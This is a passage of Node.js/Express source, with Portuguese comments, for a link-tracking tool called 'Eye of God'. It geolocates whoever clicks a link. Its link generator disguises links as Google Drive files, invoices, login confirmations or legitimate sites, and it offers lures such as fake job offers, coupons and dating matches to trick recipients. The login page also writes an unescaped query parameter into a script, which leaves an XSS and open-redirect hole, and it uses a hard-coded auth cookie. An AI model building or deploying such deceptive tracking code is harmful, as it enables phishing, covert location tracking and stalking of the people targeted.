                    ` : ''}
                  }
                } catch (e) {
                  console.error('Erro ao processar mapa com coordenadas diretas:', e);
                  const mapElement = document.getElementById('map-${index}');
                  if (mapElement) {
                    mapElement.innerHTML = '<p style="padding: 15px; text-align: center;">Erro ao carregar o mapa.</p>';
                  }
                }
              `;
            }
            
            // Caso contrário, usamos a busca por localização como antes
            // Preparar a consulta para o serviço de geocodificação
            let searchQuery = trace.ipInfo.location;
            
            // Se a localização contém apenas um nome sem vírgulas, adicionamos a palavra "país" para melhorar a busca
            if (!searchQuery.includes(',') && searchQuery.trim().split(' ').length === 1) {
              searchQuery = `${searchQuery} país`;
            }
            
            return `
              try {
                fetch('https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(searchQuery)}&limit=1')
                  .then(response => response.json())
                  .then(data => {
                    if (data && data.length > 0) {
                      const mapElement = document.getElementById('map-${index}');
                      if (mapElement) {
                        const map${index} = L.map('map-${index}').setView([data[0].lat, data[0].lon], 6);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                          attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                        }).addTo(map${index});
                        
                        L.marker([data[0].lat, data[0].lon]).addTo(map${index})
                          .bindPopup('${trace.ipInfo.location.replace(/'/g, "\\'")} <br><small>Localização aproximada</small>')
                          .openPopup();
                      }
                    } else {
                      console.log('Não foi possível encontrar coordenadas para: ${trace.ipInfo.location}');
                      const mapElement = document.getElementById('map-${index}');
                      if (mapElement) {
                        mapElement.innerHTML = '<p style="padding: 15px; text-align: center;">Não foi possível carregar o mapa para esta localização.</p>';
                      }
                    }
                  })
                  .catch(err => {
                    console.error('Erro ao carregar mapa:', err);
                    const mapElement = document.getElementById('map-${index}');
                    if (mapElement) {
                      mapElement.innerHTML = '<p style="padding: 15px; text-align: center;">Erro ao carregar o mapa.</p>';
                    }
                  });
              } catch (e) {
                console.error('Erro ao processar mapa:', e);
              }
            `;
          }
          return '';
        }).join('')}
      });
    </script>
  </body>
  </html>
  `;
  
  res.send(html);
});

// Pagina inicial/root (Vamos enviar uma página simples de formulário)
app.get('/', (req, res) => {
  const html = `
  <!DOCTYPE html>
  <html lang="pt-BR">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eye of God - Rastreador de Mensagens</title>
    <style>
      body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        line-height: 1.6;
        margin: 0;
        padding: 0;
        background-color: #f8f9fa;
        color: #333;
      }
      .container {
        max-width: 800px;
        margin: 40px auto;
        padding: 20px;
      }
      header {
        background: linear-gradient(135deg, #2c3e50, #34495e);
        color: white;
        padding: 40px 20px;
        text-align: center;
        border-radius: 8px 8px 0 0;
        position: relative;
        overflow: hidden;
      }
      header::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: url('https://www.transparenttextures.com/patterns/cubes.png');
        opacity: 0.1;
      }
      .content {
        background: white;
        padding: 30px;
        border-radius: 0 0 8px 8px;
        box-shadow: 0 5px 20px rgba(0,0,0,0.05);
      }
      h1 {
        margin: 0;
        font-size: 2.5em;
        letter-spacing: 1px;
      }
      header p {
        margin: 10px 0 0;
        font-size: 1.2em;
        opacity: 0.9;
      }
      .form-group {
        margin-bottom: 25px;
      }
      label {
        display: block;
        margin-bottom: 8px;
        font-weight: 500;
        color: #2c3e50;
      }
      input[type="text"] {
        width: 100%;
        padding: 12px;
        border: 1px solid #ddd;
        border-radius: 6px;
        font-size: 1em;
        transition: border-color 0.3s, box-shadow 0.3s;
      }
      input[type="text"]:focus {
        border-color: #3498db;
        box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.25);
        outline: none;
      }
      button {
        background: #3498db;
        color: white;
        border: none;
        padding: 14px 25px;
        border-radius: 6px;
        cursor: pointer;
        font-size: 1em;
        font-weight: 500;
        transition: background 0.3s;
        display: inline-flex;
        align-items: center;
        justify-content: center;
      }
      button:hover {
        background: #2980b9;
      }
      button svg {
        margin-right: 8px;
      }
      .result {
        margin-top: 30px;
        padding: 20px;
        background-color: #f8f9fa;
        border-radius: 8px;
        display: none;
        border-left: 4px solid #3498db;
      }
      .result h3 {
        margin-top: 0;
        color: #2c3e50;
      }
      .result a {
        color: #3498db;
        text-decoration: none;
        word-break: break-all;
      }
      .result a:hover {
        text-decoration: underline;
      }
      .copy-container {
        display: flex;
        align-items: center;
        background: #eee;
        padding: 8px;
        border-radius: 4px;
        margin: 10px 0;
      }
      .copy-container input {
        flex: 1;
        border: none;
        background: transparent;
        padding: 5px;
      }
      .copy-btn {
        background: #3498db;
        color: white;
        border: none;
        padding: 5px 10px;
        border-radius: 3px;
        cursor: pointer;
      }
      .features {
        display: flex;
        flex-wrap: wrap;
        gap: 20px;
        margin: 30px 0;
      }
      .feature {
        flex: 1;
        min-width: 200px;
        background: #f8f9fa;
        padding: 15px;
        border-radius: 8px;
        display: flex;
        flex-direction: column;
        align-items: center;
        text-align: center;
      }
      .feature-icon {
        font-size: 2.5em;
        margin-bottom: 15px;
        color: #3498db;
      }
      .footer {
        text-align: center;
        margin-top: 40px;
        color: #7f8c8d;
        font-size: 0.9em;
      }
      .qr-code {
        text-align: center;
        margin: 20px 0;
      }
      .loading {
        display: none;
        text-align: center;
        padding: 20px;
      }
      .spinner {
        border: 3px solid #f3f3f3;
        border-radius: 50%;
        border-top: 3px solid #3498db;
        width: 30px;
        height: 30px;
        animation: spin 1s linear infinite;
        margin: 0 auto 10px;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      .form-control {
        width: 100%;
        padding: 12px;
        border: 1px solid #ddd;
        border-radius: 6px;
        font-size: 1em;
        background-color: white;
        transition: border-color 0.3s, box-shadow 0.3s;
      }
      .form-control:focus {
        border-color: #3498db;
        box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.25);
        outline: none;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <header>
        <h1>Eye of God</h1>
        <p>Sistema de Rastreamento de Mensagens</p>
      </header>
      
      <div class="content">
        <h2>Gerar Link de Rastreamento</h2>
        <p>Este sistema permite rastrear mensagens desde o envio até o destino. Crie um link personalizado, compartilhe-o e monitore sua jornada.</p>
        
        <div class="features">
          <div class="feature">
            <div class="feature-icon">🔗</div>
            <h3>Links Rastreáveis</h3>
            <p>Gere links únicos para compartilhar em mensagens</p>
          </div>
          <div class="feature">
            <div class="feature-icon">🌍</div>
            <h3>Geolocalização</h3>
            <p>Visualize a localização dos acessos no mapa</p>
          </div>
          <div class="feature">
            <div class="feature-icon">📊</div>
            <h3>Estatísticas</h3>
            <p>Analise detalhes sobre cada acesso ao link</p>
          </div>
        </div>
        
        <form id="linkForm">
          <div class="form-group">
            <label for="targetUrl">URL de Destino:</label>
            <input type="text" id="targetUrl" name="targetUrl" placeholder="https://exemplo.com" required>
            <small style="color:#666;display:block;margin-top:5px;">Insira a URL para onde seu link deve redirecionar</small>
          </div>
          
          <div class="form-group">
            <label for="maskStyle">Aparência do Link:</label>
            <select id="maskStyle" name="maskStyle" class="form-control">
              <option value="default">Padrão (t/ID)</option>
              <option value="short">Link curto e discreto (l/abc123)</option>
              <option value="friendly">Nome amigável (seguro-link-123)</option>
              <option value="google">Google Drive (drive/document/view/...)</option>
              <option value="document">Documento compartilhado (docs/shared/...)</option>
              <option value="photo">Álbum de fotos (photos/album/...)</option>
              <option value="payment">Pagamento (payment/invoice/...)</option>
              <option value="login">Confirmação de login (account/login/...)</option>
              <option value="custom">Máscara personalizada</option>
            </select>
            <small style="color:#666;display:block;margin-top:5px;">Escolha como seu link aparecerá para os destinatários</small>
          </div>
          
          <div id="customMaskGroup" class="form-group" style="display:none;">
            <label for="customMask">Máscara Personalizada:</label>
            <input type="text" id="customMask" name="customMask" placeholder="www.sitelegitimo.com" class="form-control">
            <small style="color:#666;display:block;margin-top:5px;">Insira uma URL de máscara personalizada (ex: www.globo.com, facebook.com/perfil, etc)</small>
            <div class="alert alert-info" style="margin-top:10px;padding:10px;background-color:#e8f4ff;border-left:4px solid #3498db;font-size:0.9em;">
              <strong>Como funciona:</strong> Quando alguém receber seu link, a URL exibida parecerá ser a que você digitou aqui, 
              mas ao clicar, eles serão redirecionados através do nosso sistema de rastreamento.
            </div>
          </div>
          
          <div class="form-group">
            <label>Tipo de Link:</label>
            <select id="linkTemplateType" class="form-control">
              <option value="default">Padrão</option>
              <option value="emprego">Vaga de Emprego/Estágio</option>
              <option value="cupom">Cupom de Desconto</option>
              <option value="evento">Convite para Evento</option>
              <option value="namoro">Match de Relacionamento</option>
              <option value="entrega">Confirmação de Entrega</option>
              <option value="custom">Personalizado</option>
            </select>
          </div>
          
          <div id="customTemplateOptions" style="display:none">
            <div class="form-group">
              <label>Título da Página:</label>
              <input type="text" id="customTitle" class="form-control">
            </div>
            <div class="form-group">
              <label>Mensagem de Localização:</label>
              <input type="text" id="customMessage" class="form-control">
            </div>
            <div class="form-group">
              <label>Cor Principal (Hex):</label>
              <input type="color" id="customColor" class="form-control">
            </div>
            <div class="form-group">
              <label>Ícone (FontAwesome):</label>
              <select id="customIcon" class="form-control">
                <!-- Opções de ícones populares -->
              </select>
            </div>
          </div>
          
          <button type="submit">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
              <path d="M4.715 6.542 3.343 7.914a3 3 0 1 0 4.243 4.243l1.828-1.829A3 3 0 0 0 8.586 5.5L8 6.086a1 1 0 0 0-.154.199 2 2 0 0 1 .861 3.337L6.88 11.45a2 2 0 1 1-2.83-2.83l.793-.792a4 4 0 0 1-.128-1.287z"/>
              <path d="M6.586 4.672A3 3 0 0 0 7.414 9.5l.775-.776a2 2 0 0 1-.896-3.346L9.12 3.55a2 2 0 1 1 2.83 2.83l-.793.792c.112.42.155.855.128 1.287l1.372-1.372a3 3 0 1 0-4.243-4.243z"/>
            </svg>
            Gerar Link
          </button>
        </form>
        
        <div class="loading" id="loading">
          <div class="spinner"></div>
          <p>Gerando seu link de rastreamento...</p>
        </div>
        
        <div class="result" id="result">
          <h3>Link Gerado com Sucesso!</h3>
          
          <p><strong>Link de Rastreamento:</strong></p>
          <div class="copy-container">
            <input type="text" readonly id="trackingLink">
            <button class="copy-btn" onclick="copyLink('trackingLink')">Copiar</button>
          </div>
          
          <p><strong>Página de Informações:</strong></p>
          <div class="copy-container">
            <input type="text" readonly id="infoLink">
            <button class="copy-btn" onclick="copyLink('infoLink')">Copiar</button>
          </div>
          
          <div class="qr-code" id="qrCode"></div>
          
          <p>Use este link em suas mensagens e depois acesse a página de informações para ver o caminho percorrido.</p>
          <p><a href="#" id="openInfoLink">Ver estatísticas de rastreamento →</a></p>
        </div>
      </div>
      
      <div class="footer">
        <p>Eye of God - Sistema de Rastreamento de Mensagens</p>
        <p>Desenvolvido por @CryptoDevBR</p>
      </div>
    </div>
    
    <script>
      function copyLink(elementId) {
        const linkInput = document.getElementById(elementId);
        linkInput.select();
        document.execCommand('copy');
        
        // Feedback visual
        const btn = linkInput.nextElementSibling;
        const originalText = btn.textContent;
        btn.textContent = 'Copiado!';
        setTimeout(() => {
          btn.textContent = originalText;
        }, 2000);
      }
      
      // Controlar a exibição do campo de máscara personalizada
      document.addEventListener('DOMContentLoaded', function() {
        const maskStyleSelect = document.getElementById('maskStyle');
        const customMaskGroup = document.getElementById('customMaskGroup');
        
        // Função para alternar a visibilidade do campo de máscara personalizada
        function toggleCustomMaskField() {
          if (maskStyleSelect.value === 'custom') {
            customMaskGroup.style.display = 'block';
          } else {
            customMaskGroup.style.display = 'none';
          }
        }
        
        // Verificar estado inicial
        toggleCustomMaskField();
        
        // Ouvir mudanças na seleção
        maskStyleSelect.addEventListener('change', toggleCustomMaskField);
        
        // Formulário de envio
        document.getElementById('linkForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const targetUrl = document.getElementById('targetUrl').value;
          const maskStyle = document.getElementById('maskStyle').value;
          let customMask = document.getElementById('customMask').value;
          const templateType = document.getElementById('templateType').value;
          const loading = document.getElementById('loading');
          const result = document.getElementById('result');
          
          // Validar máscara personalizada quando o estilo 'custom' estiver selecionado
          if (maskStyle === 'custom' && !customMask.trim()) {
            alert('Por favor, insira uma URL de máscara personalizada');
            return;
          }
          
          // Se não for estilo personalizado, limpar o valor para não enviar desnecessariamente
          if (maskStyle !== 'custom') {
            customMask = '';
          }
          
          // Mostrar loading
          loading.style.display = 'block';
          result.style.display = 'none';
          
          // Fazer a requisição para gerar o link
          fetch('/api/generate-link', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
              targetUrl: targetUrl,
              maskStyle: maskStyle,
              customMask: customMask,
              templateType: templateType
            })
          })
          .then(function(response) {
            return response.json();
          })
          .then(function(data) {
            if (data.success) {
              const trackingLink = document.getElementById('trackingLink');
              const infoLink = document.getElementById('infoLink');
              const openInfoLink = document.getElementById('openInfoLink');
              const qrCode = document.getElementById('qrCode');
              
              // Preencher os campos
              trackingLink.value = data.trackingLink;
              infoLink.value = window.location.origin + '/info/' + data.linkId;
              openInfoLink.href = '/info/' + data.linkId;
              
              // Gerar QR Code
              qrCode.innerHTML = 
                '<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=' + 
                encodeURIComponent(data.trackingLink) + 
                '" alt="QR Code do link">' +
                '<p>Escaneie este QR Code para acessar o link</p>';
              
              // Esconder loading e mostrar resultado
              loading.style.display = 'none';
              result.style.display = 'block';
            } else {
              loading.style.display = 'none';
              alert('Erro ao gerar link: ' + data.error);
            }
          })
          .catch(function(error) {
            loading.style.display = 'none';
            console.error('Erro:', error);
            alert('Erro ao gerar link. Verifique sua conexão e tente novamente.');
          });
        });
      });
    </script>
  </body>
  </html>
  `;
  
  res.send(html);
});

// Iniciar o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
  console.log(`Acesse: http://localhost:${PORT}`);
}); 

// Função para lidar com redirecionamentos de URLs baseadas em template
function handleTemplateRedirect(req, res, templateType) {
  const { friendlySlug } = req.params;
  const db = readDB();
  
  // O slug é do formato "tipo-adjetivo-nome-numero", então precisamos pegar o slug completo
  const slugStart = `${linkTemplates[templateType].slugPrefix}-`;
  
  // Encontrar o link pelo slug que começa com o prefixo correto
  const linkId = Object.keys(db.links).find(id => {
    const link = db.links[id];
    return link.friendlySlug && link.friendlySlug.startsWith(slugStart);
  });
  
  if (!linkId) {
    return res.status(404).send('Link não encontrado');
  }
  
  // Redirecionar para a rota principal de tracking
  res.redirect(`/t/${linkId}`);
}

// Rotas
// Página de login
app.get('/login', (req, res) => {
  const redirect = req.query.redirect || '/';
  
  // Página de login simples 
  const html = `
  <!DOCTYPE html>
  <html lang="pt-BR">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Eye of God</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
      body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background-color: #f0f2f5;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        color: #333;
      }
      .login-container {
        background-color: white;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        padding: 40px;
        width: 90%;
        max-width: 400px;
      }
      .login-header {
        text-align: center;
        margin-bottom: 30px;
      }
      .login-icon {
        font-size: 48px;
        color: #3498db;
        margin-bottom: 20px;
      }
      h1 {
        margin: 0 0 10px;
        font-size: 24px;
        font-weight: 600;
      }
      .login-form {
        margin-top: 20px;
      }
      .form-group {
        margin-bottom: 20px;
      }
      label {
        display: block;
        margin-bottom: 8px;
        font-weight: 500;
      }
      input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ddd;
        border-radius: 4px;
        font-size: 16px;
        box-sizing: border-box;
        transition: border-color 0.3s;
      }
      input:focus {
        border-color: #3498db;
        outline: none;
      }
      .submit-btn {
        width: 100%;
        padding: 12px;
        background-color: #3498db;
        color: white;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        font-weight: 500;
        cursor: pointer;
        transition: background-color 0.3s;
      }
      .submit-btn:hover {
        background-color: #2980b9;
      }
      .error-message {
        color: #e74c3c;
        margin-top: 20px;
        text-align: center;
        display: none;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <div class="login-header">
        <div class="login-icon">
          <i class="fas fa-eye"></i>
        </div>
        <h1>Eye of God</h1>
        <p>Painel de controle de rastreamento</p>
      </div>
      
      <form id="loginForm" class="login-form">
        <div class="form-group">
          <label for="username">Usuário</label>
          <input type="text" id="username" name="username" required>
        </div>
        
        <div class="form-group">
          <label for="password">Senha</label>
          <input type="password" id="password" name="password" required>
        </div>
        
        <button type="submit" class="submit-btn">Entrar</button>
        
        <div id="errorMessage" class="error-message">
          Usuário ou senha incorretos
        </div>
      </form>
    </div>
    
    <script>
      document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const redirect = '${redirect}';
        
        // Fazer a requisição para a API de login
        fetch('/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ username, password })
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            // Login bem-sucedido, redirecionar para a página solicitada
            window.location.href = redirect;
          } else {
            // Exibir mensagem de erro
            document.getElementById('errorMessage').style.display = 'block';
          }
        })
        .catch(error => {
          console.error('Erro ao fazer login:', error);
          document.getElementById('errorMessage').style.display = 'block';
        });
      });
    </script>
  </body>
  </html>
  `;
  
  res.send(html);
});

// API de login
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  // Verificar credenciais
  if (username === CREDENTIALS.username && password === CREDENTIALS.password) {
    // Definir cookie de autenticação
    res.cookie('authToken', 'eyeofgod-juliodev-auth', {
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 dias
      httpOnly: true,
      secure: isProduction, // Apenas HTTPS em produção
      sameSite: 'strict'
    });
    
    return res.json({ success: true });
  }
  
  // Credenciais inválidas
  return res.status(401).json({ success: false, message: 'Credenciais inválidas' });
});

// Base de dados em arquivo
// ... existing code ...
